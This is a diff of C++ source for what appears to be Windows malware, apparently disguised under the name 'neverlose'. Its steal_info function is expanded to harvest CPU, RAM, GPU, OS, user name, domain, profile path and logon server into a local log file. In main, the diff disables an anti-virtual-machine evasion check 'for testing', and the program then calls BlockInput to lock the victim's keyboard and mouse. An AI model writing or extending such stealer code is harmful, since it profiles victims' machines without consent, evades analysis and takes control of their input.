@@ -245,48 +245,70 @@ void steal_info()
         return s;
     };
 
-    wchar_t buf[512];
+    auto regStr = [&](HKEY root, const wchar_t* path, const wchar_t* val) -> std::string {
+        HKEY hk;
+        if (RegOpenKeyExW(root, path, 0, KEY_READ, &hk) != ERROR_SUCCESS) return "";
+        wchar_t buf[256] = {};
+        DWORD sz = sizeof(buf);
+        RegQueryValueExW(hk, val, nullptr, nullptr, (BYTE*)buf, &sz);
+        RegCloseKey(hk);
+        return w2s(buf);
+    };
 
-    if (GetEnvironmentVariableW(L"LOGONSERVER", buf, 512))
-        add_line("PC Name", w2s(buf));
-    if (GetEnvironmentVariableW(L"PROCESSOR_IDENTIFIER", buf, 512))
-        add_line("CPU Type", w2s(buf));
-    if (GetEnvironmentVariableW(L"PROCESSOR_ARCHITECTURE", buf, 512))
-        add_line("CPU Arch", w2s(buf));
-    if (GetEnvironmentVariableW(L"PROCESSOR_REVISION", buf, 512))
-        add_line("CPU Revision", w2s(buf));
+    // --- CPU ---
+    std::string cpuName = regStr(HKEY_LOCAL_MACHINE,
+        L"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", L"ProcessorNameString");
+    add_line("CPU", cpuName.empty() ? "unknown" : cpuName);
+
+    wchar_t buf[512];
     if (GetEnvironmentVariableW(L"NUMBER_OF_PROCESSORS", buf, 512))
         add_line("CPU Cores", w2s(buf));
 
-    SYSTEM_INFO si;
-    GetNativeSystemInfo(&si);
-    add_line("CPU Arch (native)", std::to_string(si.wProcessorArchitecture));
-    add_line("CPU Count (logical)", std::to_string(si.dwNumberOfProcessors));
+    // --- RAM ---
+    MEMORYSTATUSEX ms = { sizeof(ms) };
+    if (GlobalMemoryStatusEx(&ms)) {
+        char ram[32];
+        sprintf_s(ram, "%.1f GB", ms.ullTotalPhys / (1024.0 * 1024.0 * 1024.0));
+        add_line("Total RAM", ram);
+    }
 
-    if (GetEnvironmentVariableW(L"OS", buf, 512))
-        add_line("OS", w2s(buf));
+    // --- GPU ---
+    DISPLAY_DEVICEW dd = { sizeof(dd) };
+    if (EnumDisplayDevicesW(nullptr, 0, &dd, 0))
+        add_line("GPU", w2s(dd.DeviceString));
+    // VRAM from registry
+    std::string vram = regStr(HKEY_LOCAL_MACHINE,
+        L"SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000",
+        L"HardwareInformation.qwMemorySize");
+    if (!vram.empty()) {
+        LARGE_INTEGER li;
+        li.QuadPart = _atoi64(vram.c_str());
+        char vr[32];
+        sprintf_s(vr, "GPU VRAM: %.0f MB", li.QuadPart / (1024.0 * 1024.0));
+        add_line("GPU VRAM", vr);
+    }
 
-    add_line("OS Name", []() -> std::string {
-        HKEY hKey;
-        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
-            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
-            0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-            char val[128] = {};
-            DWORD size = sizeof(val);
-            RegQueryValueExA(hKey, "ProductName", nullptr, nullptr, (LPBYTE)val, &size);
-            RegCloseKey(hKey);
-            return std::string(val);
-        }
-        return "unknown";
-    }());
+    // --- OS ---
+    add_line("OS Name", regStr(HKEY_LOCAL_MACHINE,
+        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ProductName"));
 
+    // --- User ---
     if (GetEnvironmentVariableW(L"USERNAME", buf, 512))
         add_line("User Name", w2s(buf));
     if (GetEnvironmentVariableW(L"USERDOMAIN", buf, 512))
         add_line("User Domain", w2s(buf));
     if (GetEnvironmentVariableW(L"USERPROFILE", buf, 512))
         add_line("User Profile", w2s(buf));
+    if (GetEnvironmentVariableW(L"LOGONSERVER", buf, 512))
+        add_line("PC Name", w2s(buf));
 
+    // --- Display ---
+    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
+    char res[32];
+    sprintf_s(res, "%dx%d", sw, sh);
+    add_line("Resolution", res);
+
+    // --- save ---
     wchar_t tempDir[MAX_PATH];
     if (GetEnvironmentVariableW(L"LOCALAPPDATA", tempDir, MAX_PATH)) {
         wcscat_s(tempDir, L"\\sysinfo.log");
@@ -1326,10 +1348,8 @@ bool is_vm()
 
 int main()
 {
-    if (is_vm()) {
-        MessageBoxW(nullptr, L"cannot run in a visual mechine", L"neverlose", MB_OK | MB_ICONERROR);
-        return 0;
-    }
+    // anti-VM disabled for testing
+    // if (is_vm()) { MessageBoxW(...); return 0; }
 
     BlockInput(TRUE);
 
